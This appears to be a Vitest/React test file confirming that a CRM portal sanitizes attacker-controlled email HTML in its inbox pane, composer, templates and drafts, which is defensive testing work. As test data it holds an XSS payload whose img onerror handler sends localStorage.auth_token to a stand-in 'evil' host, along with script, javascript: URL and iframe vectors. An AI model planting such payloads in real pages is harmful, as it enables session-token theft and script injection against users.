// BF_PORTAL_HTML_SANITIZE_v1 - inbound email HTML is attacker-controlled.
// BF_PORTAL_v789_SOURCE_GREP - rewritten as a behaviour test.
import { beforeEach, describe, expect, it, vi } from "vitest";
import { fireEvent, render, screen, waitFor } from "@testing-library/react";
import { createElement } from "react";
import { sanitizeHtml } from "../sanitizeHtml";

const h = vi.hoisted(() => {
  const apiFn = vi.fn() as any;
  apiFn.get = vi.fn(); apiFn.post = vi.fn(); apiFn.put = vi.fn(); apiFn.patch = vi.fn(); apiFn.delete = vi.fn();
  return { apiFn };
});
vi.mock("@/api", () => ({ api: h.apiFn, default: h.apiFn, apiGetEnvelope: vi.fn(), rawApiFetch: vi.fn() }));
vi.mock("@/api/o365Interceptor", () => ({ withO365Scopes: (_s: unknown, call: () => unknown) => call() }));
vi.mock("@/lib/urlTicket", () => ({ teamSocketUrl: vi.fn(async () => null), getUrlTicket: vi.fn(async () => null) }));

import CommunicationsPage from "@/pages/communications/CommunicationsPage";
import O365ComposeModal from "@/components/communications/O365ComposeModal";

// The token-stealing payload from the original report, plus the other usual vectors.
const EVIL = `<p>Hello Todd</p><img src="x" onerror="fetch('https://evil/?t='+localStorage.auth_token)"><script>window.__pwned = 1</script><a href="javascript:alert(1)">click me</a><iframe src="https://evil"></iframe>`;

function expectClean(root: ParentNode) {
  expect(root.querySelector("[onerror]")).toBeNull();
  expect(root.querySelector("script")).toBeNull();
  expect(root.querySelector("iframe")).toBeNull();
  expect(root.querySelector('a[href^="javascript:"]')).toBeNull();
  expect((root as Element).innerHTML ?? "").not.toContain("localStorage");
  expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
}

describe("sanitizeHtml", () => {
  it("strips the localStorage-token-exfiltration payload", () => {
    const out = sanitizeHtml(`<img src=x onerror="fetch('https://evil/?t='+localStorage.auth_token)">`);
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("localStorage");
  });

  it("strips script tags and javascript: URLs", () => {
    expect(sanitizeHtml("<script>alert(1)</script>")).not.toContain("script");
    expect(sanitizeHtml(`<a href="javascript:alert(1)">x</a>`)).not.toContain("javascript:");
  });

  it("strips iframes, forms and event handlers", () => {
    const out = sanitizeHtml(`<iframe src="https://evil"></iframe><form action="/x"><input></form><div onclick="x()">hi</div>`);
    expect(out).not.toContain("iframe");
    expect(out).not.toContain("<form");
    expect(out).not.toContain("onclick");
  });

  it("keeps legitimate email markup", () => {
    const out = sanitizeHtml(`<p>Hello <strong>Todd</strong></p><a href="https://boreal.financial">link</a>`);
    expect(out).toContain("<strong>");
    expect(out).toContain("https://boreal.financial");
  });

  it("forces links to open safely", () => {
    expect(sanitizeHtml(`<a href="https://x.com">x</a>`)).toContain("noopener");
  });
});

describe("every place that renders email HTML sanitizes it", () => {
  beforeEach(() => {
    for (const fn of [h.apiFn, h.apiFn.get, h.apiFn.post, h.apiFn.put, h.apiFn.patch, h.apiFn.delete]) fn.mockReset();
    h.apiFn.post.mockResolvedValue({});
    h.apiFn.patch.mockResolvedValue({});
    Element.prototype.scrollIntoView = vi.fn();
  });

  it("the Inbox reading pane", async () => {
    h.apiFn.mockImplementation(async (url: string) => {
      if (url === "/api/crm/shared-mailboxes") return { mine: null, shared: [] };
      if (url === "/api/crm/inbox") return [{ id: "e1", subject: "Invoice overdue", isRead: true, from: { emailAddress: { address: "bad@evil.test", name: "Mallory" } }, receivedDateTime: "2026-10-07T18:00:00Z" }];
      if (url === "/api/crm/inbox/e1") return { subject: "Invoice overdue", from: { emailAddress: { address: "bad@evil.test", name: "Mallory" } }, body: { contentType: "html", content: EVIL } };
      if (url === "/api/crm/inbox/e1/attachments") return [];
      if (url === "/api/crm/inbox/folders") return { value: [] };
      return {};
    });
    window.history.replaceState(null, "", "/communications"); // Inbox is the default tab
    const { container } = render(createElement(CommunicationsPage));
    fireEvent.click(await screen.findByText("Invoice overdue"));
    expect(await screen.findByText("Hello Todd")).toBeInTheDocument();
    expect(screen.getByText("click me")).toBeInTheDocument();
    expectClean(container);
  });

  describe("the email composer", () => {
    const body = () => document.querySelector("[contenteditable]") as HTMLElement;
    function routeCompose(extra: Record<string, unknown> = {}) {
      h.apiFn.mockImplementation(async (url: string) => {
        if (url in extra) return extra[url];
        if (url === "/api/crm/shared-mailboxes") return { mine: { address: "todd@boreal.test", display_name: "Todd" }, shared: [] };
        if (url === "/api/o365/mail/drafts") return { items: [] };
        if (url === "/api/templates" || url === "/api/collateral" || url.startsWith("/api/templates?")) return [];
        return {};
      });
    }

    it("the reply / forward body it opens with", async () => {
      routeCompose();
      render(createElement(O365ComposeModal, { open: true, initialTo: "bad@evil.test", initialSubject: "Re: Invoice", initialBody: EVIL, onClose: () => undefined }));
      await waitFor(() => expect(body().textContent).toContain("Hello Todd"));
      expectClean(body());
    });

    it("an inserted template", async () => {
      routeCompose({ "/api/templates": [{ id: "t1", name: "Evil template", body_html: EVIL, is_active: true }] });
      render(createElement(O365ComposeModal, { open: true, onClose: () => undefined }));
      const select = await screen.findByDisplayValue(/Insert template/);
      fireEvent.change(select, { target: { value: "t1" } });
      await waitFor(() => expect(body().textContent).toContain("Hello Todd"));
      expectClean(body());
    });

    it("a reopened Outlook draft", async () => {
      routeCompose({
        "/api/o365/mail/drafts": { items: [{ id: "d1", subject: "Draft one", to: [] }] },
        "/api/o365/mail/draft/d1": { item: { id: "d1", subject: "Draft one", body_html: EVIL, to: [] } },
      });
      render(createElement(O365ComposeModal, { open: true, onClose: () => undefined }));
      fireEvent.change(await screen.findByLabelText("Open a saved draft"), { target: { value: "d1" } });
      await waitFor(() => expect(body().textContent).toContain("Hello Todd"));
      expectClean(body());
    });
  });
});
